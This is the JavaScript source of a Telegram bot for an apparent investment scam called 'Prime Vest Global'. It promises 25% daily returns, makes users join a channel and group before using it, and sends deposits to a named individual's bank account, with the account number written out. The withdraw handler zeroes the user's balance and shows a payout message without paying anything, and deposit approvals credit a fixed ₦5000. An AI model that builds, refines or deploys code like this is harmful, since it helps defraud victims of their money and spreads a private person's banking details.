const { Telegraf, Markup } = require("telegraf");
const express = require("express");

const bot = new Telegraf(process.env.TOKEN);

// 🌐 KEEP RENDER ALIVE
const app = express();
app.get("/", (req, res) => res.send("Bot is running"));
app.listen(process.env.PORT || 3000);

// 🔐 CONFIG
const ADMIN_ID = process.env.ADMIN_ID;
const CHANNEL = "@starfordfreenumbers"; // PUT YOUR REAL CHANNEL
const GROUP = "@primevestglobalinvestments"; // PUT YOUR REAL GROUP
const BOT_USERNAME = "Primevestglobal_bot";

// 📦 PACKAGES
const packages = [3000,5000,10000,15000,20000,25000,40000,50000];

// 🧠 MEMORY
let users = {};
let pendingDeposits = {};

// 👤 USER
function getUser(id){
  if(!users[id]){
    users[id] = {
      balance: 500,
      deposited: 0,
      invested: 0,
      plan: null,
      start: null
    };
  }
  return users[id];
}

// 🚫 FORCE JOIN
async function checkJoin(ctx){
  try{
    let ch = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    let gr = await ctx.telegram.getChatMember(GROUP, ctx.from.id);

    if(ch.status === "left" || gr.status === "left"){
      ctx.reply(`🚫 Join first:\n${CHANNEL}\n${GROUP}`);
      return false;
    }
    return true;
  }catch{
    return true;
  }
}

// 📊 MENU
const menu = {
  reply_markup:{
    keyboard:[
      ["💼 Invest","💰 Balance"],
      ["📤 Withdraw","💳 Deposit"],
      ["👥 Referral","📊 Packages"],
      ["📜 History"]
    ],
    resize_keyboard:true
  }
};

// 🚀 START
bot.start(async (ctx)=>{
  if(!(await checkJoin(ctx))) return;

  getUser(ctx.from.id);
  ctx.reply("💰 Welcome to Prime Vest Global\n🎁 ₦500 bonus added!", menu);
});

// 💳 DEPOSIT MENU (FIXED UI)
bot.hears("💳 Deposit", async (ctx)=>{
  if(!(await checkJoin(ctx))) return;

  const rows = [];
  for (let i = 0; i < packages.length; i += 2) {
    rows.push([
      Markup.button.callback(`₦${packages[i]}`, `deposit_${packages[i]}`),
      packages[i+1] ? Markup.button.callback(`₦${packages[i+1]}`, `deposit_${packages[i+1]}`) : null
    ].filter(Boolean));
  }

  ctx.reply("💳 Choose Deposit Amount:",
    Markup.inlineKeyboard([
      ...rows,
      [Markup.button.callback("💰 Custom Amount","deposit_custom")]
    ])
  );
});

// 💳 HANDLE DEPOSIT BUTTON
bot.action(/deposit_(.+)/, async (ctx)=>{
  await ctx.answerCbQuery();

  let amount = ctx.match[1];

  if(amount === "custom"){
    pendingDeposits[ctx.from.id] = "custom";
    return ctx.reply("💰 Enter amount:");
  }

  pendingDeposits[ctx.from.id] = amount;

  ctx.reply(`💳 Deposit ₦${amount}

Bank: Moniepoint MFB
Account Number: 5075903950
Account Name: Kamsi Chosen Oragwam

📸 Send screenshot after payment.`);
});

// 💰 CUSTOM AMOUNT INPUT
bot.on("text", (ctx)=>{
  if(pendingDeposits[ctx.from.id] === "custom"){
    let amt = parseInt(ctx.message.text);

    if(isNaN(amt)) return ctx.reply("❌ Enter valid number");

    pendingDeposits[ctx.from.id] = amt;

    ctx.reply(`💳 Deposit ₦${amt}

Send screenshot after payment.`);
  }
});

// 📸 SCREENSHOT
bot.on("photo", async (ctx)=>{
  let id = ctx.from.id;
  let file = ctx.message.photo.pop().file_id;

  bot.telegram.sendPhoto(ADMIN_ID, file, {
    caption:`📥 Deposit Request\nUser: ${id}\nApprove:\n/approve_${id}`
  });

  ctx.reply("⏳ Waiting for approval...");
});

// ✅ APPROVE
bot.command(/approve_(.+)/, (ctx)=>{
  if(ctx.from.id != ADMIN_ID) return;

  let id = ctx.match[1];
  let user = getUser(id);

  user.balance += 5000;
  user.deposited += 5000;

  bot.telegram.sendMessage(id, "✅ Deposit approved ₦5000");
  ctx.reply("Approved");
});

// 📊 INVEST MENU
bot.hears(["💼 Invest","📊 Packages"], async (ctx)=>{
  if(!(await checkJoin(ctx))) return;

  const rows = [];
  for (let i = 0; i < packages.length; i += 2) {
    rows.push([
      Markup.button.callback(`₦${packages[i]}`, `invest_${packages[i]}`),
      packages[i+1] ? Markup.button.callback(`₦${packages[i+1]}`, `invest_${packages[i+1]}`) : null
    ].filter(Boolean));
  }

  ctx.reply("📊 Choose Package:", Markup.inlineKeyboard(rows));
});

// 💼 INVEST
bot.action(/invest_(.+)/, async (ctx)=>{
  await ctx.answerCbQuery();

  let amount = parseInt(ctx.match[1]);
  let user = getUser(ctx.from.id);

  if(amount < 3000) return ctx.reply("❌ Min invest ₦3000");
  if(user.balance < amount) return ctx.reply("❌ Insufficient balance");

  user.balance -= amount;
  user.invested = amount;
  user.plan = amount;
  user.start = Date.now();

  ctx.reply(`✅ Investment Started

💰 ₦${amount}
📈 Daily: ₦${amount * 0.25}`);
});

// 💰 BALANCE
bot.hears("💰 Balance", (ctx)=>{
  let u = getUser(ctx.from.id);

  let days = 0;
  let earned = 0;

  if(u.start){
    days = Math.floor((Date.now()-u.start)/(1000*60*60*24));
    if(days > 60) days = 60;
    earned = u.plan * 0.25 * days;
  }

  ctx.reply(`💰 Balance: ₦${u.balance}
📈 Earned: ₦${earned}`);
});

// 📤 WITHDRAW
bot.hears("📤 Withdraw", (ctx)=>{
  let u = getUser(ctx.from.id);

  if(u.deposited <= 0) return ctx.reply("⚠️ Deposit first");
  if(u.invested < 3000) return ctx.reply("⚠️ Invest first");
  if(u.balance < 500) return ctx.reply("❌ Min withdrawal ₦500");

  let charge = u.balance * 0.10;
  let final = u.balance - charge;

  u.balance = 0;

  ctx.reply(`💸 Withdrawal

Charge: ₦${charge}
You get: ₦${final}`);
});

// 📜 HISTORY
bot.hears("📜 History", (ctx)=>{
  let u = getUser(ctx.from.id);

  ctx.reply(`📜 Account Summary

💰 Balance: ₦${u.balance}
📊 Invested: ₦${u.invested}
💳 Deposited: ₦${u.deposited}`);
});

// 🚀 START BOT
bot.launch();
console.log("Bot running...");
